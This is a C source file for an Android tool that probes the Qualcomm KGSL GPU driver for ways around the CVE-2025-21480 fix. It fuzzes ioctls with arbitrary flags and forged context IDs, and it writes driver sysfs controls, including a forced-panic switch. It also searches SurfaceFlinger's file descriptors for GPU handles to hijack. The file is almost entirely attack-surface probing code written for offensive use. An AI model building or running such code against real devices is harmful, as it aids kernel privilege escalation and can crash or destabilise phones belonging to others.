/*
 * kgsl_bypass_research.c - CVE-2025-21480 Bypass Research Tool
 *
 * Research vectors:
 * 1. GMU Direct Command (GPU_AUX_COMMAND behavior analysis)
 * 2. Sysfs Injection (perfcounter, snapshot controls)
 * 3. Binder FD Passing (SurfaceFlinger KGSL FD hijack)
 * 4. Alternative context acquisition
 *
 * Build: aarch64-linux-android31-clang -static -O2 -o kgsl_bypass_research kgsl_bypass_research.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <dirent.h>
#include <stdint.h>

#define KGSL_DEVICE "/dev/kgsl-3d0"
#define KGSL_SYSFS "/sys/class/kgsl/kgsl-3d0"

/* KGSL IOCTLs */
#define KGSL_IOC_TYPE 0x09
#define IOCTL_KGSL_DEVICE_GETPROPERTY _IOWR(KGSL_IOC_TYPE, 0x02, struct kgsl_device_getproperty)
#define IOCTL_KGSL_GPUMEM_ALLOC_ID _IOWR(KGSL_IOC_TYPE, 0x35, struct kgsl_gpumem_alloc_id)
#define IOCTL_KGSL_GPUMEM_FREE_ID _IOWR(KGSL_IOC_TYPE, 0x36, struct kgsl_gpumem_free_id)
#define IOCTL_KGSL_GPU_AUX_COMMAND _IOWR(KGSL_IOC_TYPE, 0x55, struct kgsl_gpu_aux_command)
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x50, struct kgsl_gpu_command)

/* Property types */
#define KGSL_PROP_DEVICE_INFO 0x01
#define KGSL_PROP_VERSION 0x05
#define KGSL_PROP_GPU_MODEL 0x13
#define KGSL_PROP_GMU_VERSION 0x19

/* Context flags */
#define KGSL_CONTEXT_TYPE_MASK 0x01F00000
#define KGSL_CONTEXT_TYPE_ANY 0
#define KGSL_CONTEXT_TYPE_GL 0x00100000
#define KGSL_CONTEXT_TYPE_CL 0x00200000
#define KGSL_CONTEXT_TYPE_C2D 0x00300000
#define KGSL_CONTEXT_TYPE_RS 0x00400000
#define KGSL_CONTEXT_TYPE_VK 0x00500000
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000100
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_SECURE 0x00020000

/* AUX command types */
#define KGSL_GPU_AUX_COMMAND_TIMELINE 1
#define KGSL_GPU_AUX_COMMAND_SYNC 2

struct kgsl_device_getproperty
{
    unsigned int type;
    void *value;
    unsigned int sizebytes;
};

struct kgsl_gpumem_alloc_id
{
    unsigned int id;
    unsigned int flags;
    unsigned long size;
    unsigned long mmapsize;
    unsigned long gpuaddr;
};

struct kgsl_gpumem_free_id
{
    unsigned int id;
    unsigned int padding;
};

struct kgsl_drawctxt_create
{
    unsigned int flags;
    unsigned int drawctxt_id;
};

struct kgsl_gpu_aux_command
{
    uint64_t flags;
    uint64_t cmdlist;
    uint32_t cmdlist_size;
    uint32_t numcmds;
    uint32_t context_id;
    uint32_t reserved[5];
};

struct kgsl_gpu_command
{
    uint64_t flags;
    uint64_t cmdlist;
    uint32_t cmdsize;
    uint32_t numcmds;
    uint32_t context_id;
    uint32_t timestamp;
    uint64_t objlist;
    uint32_t objsize;
    uint32_t numobjs;
    uint64_t synclist;
    uint32_t syncsize;
    uint32_t numsyncs;
};

struct kgsl_command_object
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t id;
};

/* Sysfs writable files to test */
static const char *sysfs_writable[] = {
    "perfcounter",
    "snapshot/force_panic",
    "snapshot/faultcount",
    "snapshot/skip_ib_capture",
    "snapshot/snapshot_crashdumper",
    "snapshot/snapshot_legacy",
    "snapshot/prioritize_unrecoverable",
    "force_clk_on",
    "force_bus_on",
    "force_rail_on",
    "force_no_nap",
    "idle_timer",
    "preempt_level",
    "ft_policy",
    "ft_pagefault_policy",
    "gpuclk",
    "max_gpuclk",
    "thermal_pwrlevel",
    "default_pwrlevel",
    "max_pwrlevel",
    "min_pwrlevel",
    NULL};

/*========== SECTION 1: GMU AUX COMMAND RESEARCH ==========*/

void research_gmu_aux_command(int fd)
{
    printf("\n=== GMU AUX COMMAND RESEARCH ===\n");

    /* Test various AUX command types */
    struct kgsl_gpu_aux_command aux;

    /* Type 0: Unknown/Invalid */
    memset(&aux, 0, sizeof(aux));
    aux.flags = 0;
    aux.context_id = 0;
    errno = 0;
    int ret = ioctl(fd, IOCTL_KGSL_GPU_AUX_COMMAND, &aux);
    printf("[1] flags=0, ctx=0: ret=%d, errno=%d (%s)\n",
           ret, errno, strerror(errno));

    /* Type 1: TIMELINE */
    memset(&aux, 0, sizeof(aux));
    aux.flags = KGSL_GPU_AUX_COMMAND_TIMELINE;
    aux.context_id = 0;
    errno = 0;
    ret = ioctl(fd, IOCTL_KGSL_GPU_AUX_COMMAND, &aux);
    printf("[2] TIMELINE, ctx=0: ret=%d, errno=%d (%s)\n",
           ret, errno, strerror(errno));

    /* Type 2: SYNC */
    memset(&aux, 0, sizeof(aux));
    aux.flags = KGSL_GPU_AUX_COMMAND_SYNC;
    aux.context_id = 0;
    errno = 0;
    ret = ioctl(fd, IOCTL_KGSL_GPU_AUX_COMMAND, &aux);
    printf("[3] SYNC, ctx=0: ret=%d, errno=%d (%s)\n",
           ret, errno, strerror(errno));

    /* Try with numcmds > 0 but no cmdlist */
    memset(&aux, 0, sizeof(aux));
    aux.flags = KGSL_GPU_AUX_COMMAND_TIMELINE;
    aux.numcmds = 1;
    aux.cmdlist = 0;
    errno = 0;
    ret = ioctl(fd, IOCTL_KGSL_GPU_AUX_COMMAND, &aux);
    printf("[4] TIMELINE, numcmds=1, cmdlist=NULL: ret=%d, errno=%d (%s)\n",
           ret, errno, strerror(errno));

    /* Try with fake cmdlist pointer */
    uint64_t fake_cmd[8] = {0};
    memset(&aux, 0, sizeof(aux));
    aux.flags = KGSL_GPU_AUX_COMMAND_TIMELINE;
    aux.numcmds = 1;
    aux.cmdlist = (uint64_t)fake_cmd;
    aux.cmdlist_size = sizeof(fake_cmd);
    errno = 0;
    ret = ioctl(fd, IOCTL_KGSL_GPU_AUX_COMMAND, &aux);
    printf("[5] TIMELINE with cmdlist: ret=%d, errno=%d (%s)\n",
           ret, errno, strerror(errno));

    /* Test all flag combinations 0-15 */
    printf("\n[*] Testing flag values 0-15:\n");
    for (int i = 0; i <= 15; i++)
    {
        memset(&aux, 0, sizeof(aux));
        aux.flags = i;
        aux.context_id = 0;
        errno = 0;
        ret = ioctl(fd, IOCTL_KGSL_GPU_AUX_COMMAND, &aux);
        if (ret == 0 && errno == 0)
        {
            printf("    flags=%d: ret=0, errno=0 [INTERESTING!]\n", i);
        }
    }

    /* Analysis */
    printf("\n[*] GMU AUX Analysis:\n");
    printf("    - Returns 0 but sets errno=22 (EINVAL)\n");
    printf("    - Likely validates context_id internally\n");
    printf("    - May require valid timeline/sync fence\n");
}

/*========== SECTION 2: SYSFS INJECTION RESEARCH ==========*/

int try_write_sysfs(const char *path, const char *value)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0)
        return -1;

    ssize_t written = write(fd, value, strlen(value));
    close(fd);
    return (written > 0) ? 0 : -1;
}

int read_sysfs(const char *path, char *buf, size_t len)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0)
        return -1;

    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n > 0)
    {
        buf[n] = '\0';
        /* Remove newline */
        char *nl = strchr(buf, '\n');
        if (nl)
            *nl = '\0';
        return 0;
    }
    return -1;
}

void research_sysfs_injection()
{
    printf("\n=== SYSFS INJECTION RESEARCH ===\n");

    char path[256];
    char orig_val[256], new_val[256];
    int writable_count = 0;
    int write_success = 0;

    printf("[*] Testing sysfs write points:\n\n");

    for (int i = 0; sysfs_writable[i] != NULL; i++)
    {
        snprintf(path, sizeof(path), "%s/%s", KGSL_SYSFS, sysfs_writable[i]);

        /* Read original value */
        if (read_sysfs(path, orig_val, sizeof(orig_val)) < 0)
        {
            printf("    %s: [CANNOT READ]\n", sysfs_writable[i]);
            continue;
        }

        /* Try to write */
        if (try_write_sysfs(path, orig_val) == 0)
        {
            writable_count++;
            printf("    %-35s = %-10s [WRITABLE]\n", sysfs_writable[i], orig_val);

            /* Check if we can change the value */
            if (strcmp(orig_val, "0") == 0)
            {
                if (try_write_sysfs(path, "1") == 0)
                {
                    read_sysfs(path, new_val, sizeof(new_val));
                    if (strcmp(new_val, "1") == 0)
                    {
                        printf("        ^ VALUE CHANGED TO 1!\n");
                        write_success++;
                        /* Restore */
                        try_write_sysfs(path, "0");
                    }
                }
            }
        }
        else
        {
            printf("    %-35s = %-10s [read-only]\n", sysfs_writable[i], orig_val);
        }
    }

    printf("\n[*] Summary: %d writable, %d changeable\n", writable_count, write_success);

    /* Special test: perfcounter */
    printf("\n[*] Perfcounter deep test:\n");
    snprintf(path, sizeof(path), "%s/perfcounter", KGSL_SYSFS);

    /* Try various values */
    const char *test_vals[] = {"0", "1", "2", "255", "256", "-1", NULL};
    for (int i = 0; test_vals[i]; i++)
    {
        if (try_write_sysfs(path, test_vals[i]) == 0)
        {
            read_sysfs(path, new_val, sizeof(new_val));
            printf("    Write '%s' -> Read '%s'\n", test_vals[i], new_val);
        }
    }

    /* Test snapshot dump */
    printf("\n[*] Snapshot dump test:\n");
    snprintf(path, sizeof(path), "%s/snapshot/dump", KGSL_SYSFS);
    int dump_fd = open(path, O_RDONLY);
    if (dump_fd >= 0)
    {
        struct stat st;
        fstat(dump_fd, &st);
        printf("    dump file size: %ld bytes\n", (long)st.st_size);

        if (st.st_size > 0)
        {
            unsigned char buf[64];
            ssize_t n = read(dump_fd, buf, sizeof(buf));
            if (n > 0)
            {
                printf("    First 32 bytes: ");
                for (int i = 0; i < 32 && i < n; i++)
                {
                    printf("%02x ", buf[i]);
                }
                printf("\n");
            }
        }
        close(dump_fd);
    }
    else
    {
        printf("    dump: cannot open (%s)\n", strerror(errno));
    }
}

/*========== SECTION 3: BINDER FD PASSING RESEARCH ==========*/

int find_surfaceflinger_pid()
{
    DIR *dir = opendir("/proc");
    if (!dir)
        return -1;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL)
    {
        if (entry->d_type != DT_DIR)
            continue;

        int pid = atoi(entry->d_name);
        if (pid <= 0)
            continue;

        char cmdline_path[64];
        snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);

        int fd = open(cmdline_path, O_RDONLY);
        if (fd < 0)
            continue;

        char cmdline[256] = {0};
        read(fd, cmdline, sizeof(cmdline) - 1);
        close(fd);

        if (strstr(cmdline, "surfaceflinger"))
        {
            closedir(dir);
            return pid;
        }
    }

    closedir(dir);
    return -1;
}

void research_binder_fd()
{
    printf("\n=== BINDER FD PASSING RESEARCH ===\n");

    /* Find SurfaceFlinger */
    int sf_pid = find_surfaceflinger_pid();
    if (sf_pid < 0)
    {
        printf("[-] SurfaceFlinger not found\n");
        return;
    }
    printf("[+] SurfaceFlinger PID: %d\n", sf_pid);

    /* Check our access to SF's fds */
    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/%d/fd", sf_pid);

    DIR *dir = opendir(fd_path);
    if (!dir)
    {
        printf("[-] Cannot access %s: %s\n", fd_path, strerror(errno));
        printf("    (SELinux blocks cross-process fd access)\n");
    }
    else
    {
        printf("[+] Can open %s (unexpected!)\n", fd_path);

        int kgsl_count = 0;
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL)
        {
            char link_path[128], link_target[256];
            snprintf(link_path, sizeof(link_path), "%s/%s", fd_path, entry->d_name);

            ssize_t len = readlink(link_path, link_target, sizeof(link_target) - 1);
            if (len > 0)
            {
                link_target[len] = '\0';
                if (strstr(link_target, "kgsl"))
                {
                    printf("    SF fd %s -> %s\n", entry->d_name, link_target);
                    kgsl_count++;
                }
            }
        }
        printf("    Found %d KGSL fds in SurfaceFlinger\n", kgsl_count);
        closedir(dir);
    }

    /* Check binder devices */
    printf("\n[*] Binder devices:\n");
    const char *binder_devs[] = {"/dev/binder", "/dev/hwbinder", "/dev/vndbinder", NULL};
    for (int i = 0; binder_devs[i]; i++)
    {
        struct stat st;
        if (stat(binder_devs[i], &st) == 0)
        {
            printf("    %s: mode=%o, uid=%d, gid=%d\n",
                   binder_devs[i], st.st_mode & 0777, st.st_uid, st.st_gid);
        }
    }

    /* Test opening binder */
    int binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd >= 0)
    {
        printf("[+] Opened /dev/binder fd=%d\n", binder_fd);

        /* We could attempt BR_TRANSACTION here but need proper protocol */
        printf("    (Binder transaction requires complex protocol)\n");
        close(binder_fd);
    }
    else
    {
        printf("[-] Cannot open /dev/binder: %s\n", strerror(errno));
    }

    /* Alternative: Check service manager */
    printf("\n[*] Service Manager check:\n");
    FILE *fp = popen("service list 2>&1 | grep -i 'surface\\|gpu\\|graphics' | head -5", "r");
    if (fp)
    {
        char line[256];
        while (fgets(line, sizeof(line), fp))
        {
            printf("    %s", line);
        }
        pclose(fp);
    }
}

/*========== SECTION 4: ALTERNATIVE CONTEXT ACQUISITION ==========*/

void research_context_alternatives(int fd)
{
    printf("\n=== ALTERNATIVE CONTEXT RESEARCH ===\n");

    struct kgsl_drawctxt_create ctx;
    int ret;

    /* Test context creation with all possible flags */
    printf("[*] Testing context flag combinations:\n");

    /* Special flags that might bypass restrictions */
    unsigned int special_flags[] = {
        KGSL_CONTEXT_NO_GMEM_ALLOC,
        KGSL_CONTEXT_PREAMBLE,
        KGSL_CONTEXT_NO_GMEM_ALLOC | KGSL_CONTEXT_PREAMBLE,
        0x80000000, /* High bit */
        0x40000000,
        0x20000000,
        0x10000000,
        0x08000000,
        0x04000000,
        0x02000000,
        0x01000000,
        0x00800000,
        0x00400000,
        0x00200000,
        0x00080000,
        0x00040000,
        0x00010000,
        0x00008000,
        0x00004000,
        0x00002000,
        0x00001000,
        0x00000800,
        0x00000400,
        0x00000200,
        0x00000080,
        0x00000040,
        0x00000020,
        0x00000008,
        0x00000004,
        0x00000002,
        0x00000001,
        0xFFFFFFFF, /* All bits */
    };

    int success_count = 0;
    for (size_t i = 0; i < sizeof(special_flags) / sizeof(special_flags[0]); i++)
    {
        memset(&ctx, 0, sizeof(ctx));
        ctx.flags = special_flags[i];

        errno = 0;
        ret = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx);

        if (ret == 0)
        {
            printf("    flags=0x%08x: SUCCESS! ctx_id=%u\n",
                   special_flags[i], ctx.drawctxt_id);
            success_count++;
        }
    }

    if (success_count == 0)
    {
        printf("    All %zu flag combinations FAILED\n",
               sizeof(special_flags) / sizeof(special_flags[0]));
    }

    /* Test GPU_COMMAND without context */
    printf("\n[*] GPU_COMMAND without context test:\n");

    /* Allocate GPU memory for command buffer */
    struct kgsl_gpumem_alloc_id alloc = {0};
    alloc.size = 4096;
    alloc.flags = 0x00100000; /* KGSL_MEMFLAGS_GPUREADONLY */

    ret = ioctl(fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc);
    if (ret == 0)
    {
        printf("    Allocated cmd buffer: id=%u, gpuaddr=0x%lx\n",
               alloc.id, alloc.gpuaddr);

        /* mmap the buffer */
        void *cmd_buf = mmap(NULL, alloc.mmapsize, PROT_READ | PROT_WRITE,
                             MAP_SHARED, fd, alloc.id * 0x1000);

        if (cmd_buf != MAP_FAILED)
        {
            /* Write NOP command (PM4 Type 3) */
            uint32_t *cmd = (uint32_t *)cmd_buf;
            cmd[0] = 0xC0001000; /* Type 3 NOP, count=1 */
            cmd[1] = 0x00000000;

            /* Try submitting with context_id = 0, 1, 0xFFFFFFFF */
            unsigned int ctx_ids[] = {0, 1, 0x7FFFFFFF, 0xFFFFFFFF};

            for (size_t i = 0; i < sizeof(ctx_ids) / sizeof(ctx_ids[0]); i++)
            {
                struct kgsl_command_object cmd_obj = {0};
                cmd_obj.gpuaddr = alloc.gpuaddr;
                cmd_obj.size = 8;
                cmd_obj.flags = 1; /* KGSL_CMDLIST_IB */
                cmd_obj.id = alloc.id;

                struct kgsl_gpu_command gpu_cmd = {0};
                gpu_cmd.cmdlist = (uint64_t)&cmd_obj;
                gpu_cmd.cmdsize = sizeof(cmd_obj);
                gpu_cmd.numcmds = 1;
                gpu_cmd.context_id = ctx_ids[i];

                errno = 0;
                ret = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd);
                printf("    GPU_COMMAND ctx=%u: ret=%d, errno=%d\n",
                       ctx_ids[i], ret, errno);
            }

            munmap(cmd_buf, alloc.mmapsize);
        }

        /* Free the buffer */
        struct kgsl_gpumem_free_id free_id = {.id = alloc.id};
        ioctl(fd, IOCTL_KGSL_GPUMEM_FREE_ID, &free_id);
    }
}

/*========== SECTION 5: GMU VERSION AND CAPABILITIES ==========*/

void probe_gmu_capabilities(int fd)
{
    printf("\n=== GMU CAPABILITIES ===\n");

    /* Get GMU version */
    uint32_t gmu_ver = 0;
    struct kgsl_device_getproperty prop = {
        .type = KGSL_PROP_GMU_VERSION,
        .value = &gmu_ver,
        .sizebytes = sizeof(gmu_ver)};

    if (ioctl(fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &prop) == 0)
    {
        printf("[+] GMU Version: 0x%x\n", gmu_ver);
        printf("    Major: %d, Minor: %d, Patch: %d\n",
               (gmu_ver >> 16) & 0xFF,
               (gmu_ver >> 8) & 0xFF,
               gmu_ver & 0xFF);
    }

    /* Read sysfs GMU info */
    char buf[256];
    const char *gmu_files[] = {
        "gpu_model",
        "preempt_level",
        "preemption",
        "preempt_count",
        "ft_policy",
        "ft_pagefault_policy",
        "ifpc_count",
        NULL};

    printf("\n[*] GPU/GMU sysfs values:\n");
    for (int i = 0; gmu_files[i]; i++)
    {
        char path[256];
        snprintf(path, sizeof(path), "%s/%s", KGSL_SYSFS, gmu_files[i]);
        if (read_sysfs(path, buf, sizeof(buf)) == 0)
        {
            printf("    %-25s = %s\n", gmu_files[i], buf);
        }
    }
}

/*========== MAIN ==========*/

int main(int argc, char *argv[])
{
    printf("=== KGSL Bypass Research Tool ===\n");
    printf("CVE-2025-21480 Alternative Attack Vectors\n\n");

    int fd = open(KGSL_DEVICE, O_RDWR);
    if (fd < 0)
    {
        printf("[-] Cannot open %s: %s\n", KGSL_DEVICE, strerror(errno));
        return 1;
    }
    printf("[+] Opened %s fd=%d\n", KGSL_DEVICE, fd);

    /* Run all research modules */
    probe_gmu_capabilities(fd);
    research_gmu_aux_command(fd);
    research_sysfs_injection();
    research_binder_fd();
    research_context_alternatives(fd);

    printf("\n=== RESEARCH SUMMARY ===\n");
    printf("[*] GMU AUX_COMMAND: Returns 0 with errno=22 (needs investigation)\n");
    printf("[*] Sysfs Injection: perfcounter writable, snapshot controls present\n");
    printf("[*] Binder FD Pass: SELinux blocks cross-process access\n");
    printf("[*] Context Create: All flags rejected by driver\n");

    close(fd);
    return 0;
}
